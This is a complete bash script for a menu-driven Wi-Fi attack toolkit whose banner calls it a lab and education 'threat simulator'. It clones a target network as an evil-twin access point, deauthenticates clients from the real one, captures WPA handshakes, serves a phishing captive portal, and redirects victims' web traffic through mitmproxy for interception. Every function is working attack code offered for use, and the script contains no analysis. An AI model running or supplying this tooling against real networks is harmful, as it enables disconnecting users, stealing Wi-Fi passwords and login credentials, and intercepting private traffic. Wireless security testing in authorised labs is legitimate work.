#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m'

set -e

AP_CONF="configs/hostapd.conf"
DNS_CONF="configs/dnsmasq.conf"
PHISH_PORTAL="phishing_portal"
SKINS_DIR="$PHISH_PORTAL/skins"
LOGDIR="logs"
MITM_LOG="logs/mitmproxy.log"
MITMSTATE="off"
[ -d "$LOGDIR" ] || mkdir -p "$LOGDIR"
[ -d "$SKINS_DIR" ] || mkdir -p "$SKINS_DIR"

function check_cmd() {
    command -v "$1" >/dev/null 2>&1 || { echo -e "${RED}[!] Missing required tool: $1${NC}"; exit 1; }
}

function check_deps() {
    check_cmd hostapd
    check_cmd dnsmasq
    check_cmd iw
    check_cmd airodump-ng
    check_cmd aireplay-ng
    check_cmd pkill
    check_cmd python3
    [ "$1" = "mitm" ] && check_cmd mitmproxy
}

function cleanup() {
    pkill -f 'hostapd.*config' 2>/dev/null || true
    pkill -f 'dnsmasq.*config' 2>/dev/null || true
    pkill -f 'airodump-ng' 2>/dev/null || true
    pkill -f 'aireplay-ng' 2>/dev/null || true
    pkill -f "python3 $PHISH_PORTAL/server.py" 2>/dev/null || true
    pkill -f mitmproxy 2>/dev/null || true
    pkill -f mitmweb 2>/dev/null || true
    iptables -F 2>/dev/null || true
    iptables -t nat -F 2>/dev/null || true
    systemctl restart NetworkManager 2>/dev/null || service network-manager restart 2>/dev/null || true
    [ -n "$IFACE" ] && ip link set "$IFACE" down 2>/dev/null || true
    sleep 1
    echo -e "${GREEN}[✓] Reset complete.${NC}"
}

trap cleanup EXIT

function banner() {
    clear
    echo -e "${BLUE}"
    echo "  ___  _  _ ___ _  _ _      _        _       _       _         "
    echo " |_ _|| \\| | __| \\| | |    /_\\  _ _| |_ ___| |___  | |___ ___ "
    echo "  | | | .\` | _|| .\` | |__ / _ \\| ' \\  _/ _ \\ / -_) | / -_|_-/"
    echo " |___||_|\\_|___|_|\\_|____/_/ \\_||_|\\__\\___/_\\___| |_\\___/__|"
    echo -e "${CYAN}    Wi-Fi Threat Simulator - For Lab/Education only ${NC}\n"
    echo -e "${YELLOW}MITM Status: $MITMSTATE${NC}\n"
}

function prompt_iface(){
    iwlist_out=$(iw dev 2>/dev/null | awk '/Interface/ {print NR") " $2}')
    if [ -z "$iwlist_out" ]; then
        echo -e "${RED}[!] No wireless interface found. Aborting.${NC}"
        exit 1
    fi
    echo -e "${CYAN}Available interfaces:${NC}"
    echo "$iwlist_out"
    while true; do
        read -p "Select interface number: " ifaceidx
        IFACE=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | sed -n "${ifaceidx}p")
        [ -n "$IFACE" ] && break
        echo -e "${RED}Invalid choice. Try again.${NC}"
    done
}

function scan_wifi_interfaces_and_networks() {
    iwlist_out=$(iw dev 2>/dev/null | awk '/Interface/ {print " - " $2}')
    if [ -z "$iwlist_out" ]; then
        echo -e "${RED}No wireless interface found.${NC}"
        read -p "Press Enter to return to menu..."
        return
    fi
    echo -e "${CYAN}Available wireless interfaces:${NC}"
    echo "$iwlist_out"
    echo
    for iface in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
        echo -e "${YELLOW}[Interface: $iface]${NC}"
        sudo iw "$iface" scan 2>/dev/null | grep -E 'SSID:|primary channel' | awk '
            /primary channel:/ {chan=$3}
            /SSID:/ {printf "  SSID: %-30s Channel: %s\n", substr($0, index($0,$2)), chan}'
    done
    read -p "Press Enter to return to menu..."
}

function gen_configs() {
    mkdir -p configs
    cat > "$AP_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$FAKESSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$FAKEPASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    cat > "$DNS_CONF" <<EOF
interface=$IFACE
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
listen-address=10.0.0.1
EOF
}

function start_rogue_ap(){
    check_deps
    prompt_iface
    read -p "SSID to Clone (target): " FAKESSID; [ -z "$FAKESSID" ] && echo -e "${RED}No SSID entered${NC}" && return
    while true; do read -p "Channel (e.g. 6): " CHANNEL; [[ "$CHANNEL" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel number${NC}"; done
    read -p "Set WPA2 Key (fake, for realism): " FAKEPASS; [ -z "$FAKEPASS" ] && echo -e "${RED}No passphrase entered${NC}" && return
    ip link set "$IFACE" down 2>/dev/null
    ip addr flush dev "$IFACE" 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    ip addr add 10.0.0.1/24 dev "$IFACE"
    pkill -f 'hostapd.*config' 2>/dev/null || true
    pkill -f 'dnsmasq.*config' 2>/dev/null || true
    gen_configs
    hostapd "$AP_CONF" > /tmp/hostapd.log 2>&1 &
    sleep 3
    dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
    iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
    iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
    echo -e "${GREEN}[+] Evil Twin running on 10.0.0.1${NC}"
}

function deauth_attack() {
    check_deps
    prompt_iface
    read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID given${NC}" && return
    while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel${NC}"; done
    ip link set "$IFACE" down 2>/dev/null
    iw "$IFACE" set monitor control
    ip link set "$IFACE" up
    airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
    read -p "Station (leave empty for broadcast): " STATION
    if [ -z "$STATION" ]; then
        aireplay-ng --deauth 25 -a "$BSSID" "$IFACE"
    else
        aireplay-ng --deauth 25 -a "$BSSID" -c "$STATION" "$IFACE"
    fi
}

function handshake_capture() {
    check_deps
    prompt_iface
    read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID entered${NC}" && return
    while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel${NC}"; done
    TS=$(date +%Y%m%d_%H%M%S)
    OUTFILE="$LOGDIR/handshake_$TS"
    airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
}

function select_portal_skin() {
    skins=($SKINS_DIR/*.html)
    if [ ! -f "${skins[0]}" ]; then echo -e "${RED}No skins found in $SKINS_DIR${NC}"; return; fi
    echo -e "${CYAN}Available phishing portal skins:${NC}"
    for i in "${!skins[@]}"; do
        bname=$(basename "${skins[$i]}")
        echo "$((i+1))) $bname"
    done
    read -p "Select a skin by number: " skn
    [[ "$skn" =~ ^[0-9]+$ ]] && (( skn >= 1 && skn <= ${#skins[@]} )) || { echo "Invalid choice"; return; }
    cp "${skins[$((skn-1))]}" "$PHISH_PORTAL/index.html"
    echo -e "${GREEN}[✓] Selected skin: $(basename "${skins[$((skn-1))]}")${NC}"
}

function phishing_portal() {
    check_deps
    cd phishing_portal
    lsof -i :80 -t || lsof -i :443 -t && { echo -e "${RED}[!] Port 80/443 in use. Aborting.${NC}"; cd ..; return; }
    read -p "Launch portal as HTTP (port 80) or HTTPS (port 443)? [http/https]: " proto
    if [[ "$proto" =~ ^[Hh][Tt][Tt][Pp][Ss]$ ]]; then
        sudo python3 server.py --https &
        echo -e "${GREEN}[+] Captive portal running on HTTPS (https://10.0.0.1)${NC}"
    else
        sudo python3 server.py &
        echo -e "${GREEN}[+] Captive portal running on HTTP (http://10.0.0.1)${NC}"
    fi
    cd ..
    read -p "Press Enter to kill captive portal and return to menu..."
    pkill -f "python3 server.py"
}

function start_mitmproxy() {
    check_deps mitm
    [ "$MITMSTATE" = "on" ] && echo -e "${YELLOW}[!] MITMProxy already running!${NC}" && return
    read -p "MITMProxy ui or cli? [ui/cli]: " mode
    if [ "$mode" = "ui" ]; then
        sudo mitmweb --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
    else
        sudo mitmproxy --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
    fi
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
    MITMSTATE="on"
    echo -e "${GREEN}[+] MITMProxy enabled. Logs at $MITM_LOG.${NC}"
}

function stop_mitmproxy() {
    pkill -f mitmproxy 2>/dev/null || true
    pkill -f mitmweb 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null || true
    sleep 1
    MITMSTATE="off"
    echo -e "${GREEN}[+] MITMProxy stopped.${NC}"
}

while true; do
    banner
    echo -e "${BLUE}1) Scan WiFi interfaces & networks${NC}"
    echo -e "${BLUE}2) Start Rogue AP (Evil Twin)${NC}"
    echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
    echo -e "${BLUE}4) Capture WPA Handshake${NC}"
    echo -e "${BLUE}5) Choose phishing portal skin${NC}"
    echo -e "${BLUE}6) Launch Captive Phishing Portal${NC}"
    if [ "$MITMSTATE" = "on" ]; then
        echo -e "${YELLOW}7) Stop MITMProxy + logs${NC}"
    else
        echo -e "${BLUE}7) Launch MITMProxy (sniff/intercept)${NC}"
    fi
    echo -e "${BLUE}8) SAFE TEARDOWN/RESET${NC}"
    echo -e "${BLUE}9) Exit${NC}"
    echo -ne "${CYAN}Your choice [1-9]: ${NC}"; read CHOICE
    case $CHOICE in
        1) scan_wifi_interfaces_and_networks ;;
        2) start_rogue_ap ;;
        3) deauth_attack ;;
        4) handshake_capture ;;
        5) select_portal_skin ;;
        6) phishing_portal ;;
        7) if [ "$MITMSTATE" = "off" ]; then start_mitmproxy; else stop_mitmproxy; fi ;;
        8) cleanup ;;
        9) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
    read -p "Press Enter to return to menu..."
done
